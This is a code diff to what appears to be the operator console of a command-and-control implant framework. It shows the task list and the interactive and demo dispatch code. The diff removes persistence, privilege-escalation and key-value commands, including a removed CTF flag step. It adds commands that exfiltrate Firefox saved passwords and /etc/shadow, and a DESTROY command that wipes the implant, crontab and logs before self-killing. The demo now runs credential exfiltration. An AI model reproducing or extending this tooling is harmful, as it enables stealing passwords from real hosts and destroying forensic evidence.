@@ -42,14 +42,13 @@ Commands:
   task <ID> RUN_CMD <shell command>
   task <ID> SYSINFO
   task <ID> RECON_BUNDLE            - full host recon (multi-step)
-  task <ID> PERSIST                 - install @reboot crontab (multi-step)
-  task <ID> PRIVESC                 - enumerate + attempt privilege escalation (multi-step)
   task <ID> EXFIL_FILE <path>
-  task <ID> READ_DATA <key>
-  task <ID> WRITE_DATA <key> <value>
+  task <ID> FIREFOX_EXFIL          - exfil Firefox saved passwords (key4.db + logins.json)
+  task <ID> SHADOW_EXFIL           - exfil /etc/shadow
   task <ID> DELETE_FILE <path>
   task <ID> HEARTBEAT
   task <ID> SHUTDOWN
+  task <ID> DESTROY                 - wipe implant, init.d, crontab, logs, then self-kill
   quit / exit
 """
 
@@ -124,15 +123,10 @@ def _interactive(sock):
                 payload = {"cmd": args}
             elif c2_cmd == "EXFIL_FILE":
                 payload = {"path": args}
-            elif c2_cmd == "READ_DATA":
-                payload = {"key": args}
-            elif c2_cmd == "WRITE_DATA":
-                kv = args.split(None, 1)
-                payload = {"key": kv[0], "value": kv[1] if len(kv) > 1 else ""}
             elif c2_cmd == "DELETE_FILE":
                 payload = {"path": args}
-            elif c2_cmd in ("HEARTBEAT", "SYSINFO", "SHUTDOWN",
-                            "RECON_BUNDLE", "PERSIST", "PRIVESC"):
+            elif c2_cmd in ("HEARTBEAT", "SYSINFO", "SHUTDOWN", "DESTROY",
+                            "RECON_BUNDLE", "FIREFOX_EXFIL", "SHADOW_EXFIL"):
                 payload = {}
             else:
                 print("  Unknown command: {0}".format(c2_cmd))
@@ -163,12 +157,10 @@ def _demo(sock):
         ("HEARTBEAT",     {}),
         ("SYSINFO",       {}),
         ("RUN_CMD",       {"cmd": "whoami && id"}),
-        ("RECON_BUNDLE",  {}),
-        ("PERSIST",       {}),
-        ("PRIVESC",       {}),
-        ("WRITE_DATA",    {"key": "flag", "value": "CTF{c2_beacon_success}"}),
-        ("READ_DATA",     {"key": "flag"}),
-        ("EXFIL_FILE",    {"path": "/etc/hostname"}),
+        ("RECON_BUNDLE",   {}),
+        ("FIREFOX_EXFIL",  {}),
+        ("SHADOW_EXFIL",   {}),
+        ("EXFIL_FILE",     {"path": "/etc/hostname"}),
     ]
 
     for command, payload in tasks:
@@ -180,7 +172,6 @@ def _demo(sock):
                 result.get("stdout")
                 or result.get("value")
                 or result.get("message")
-                or result.get("escalation")
                 or result.get("crontab")
                 or str(result)
             )
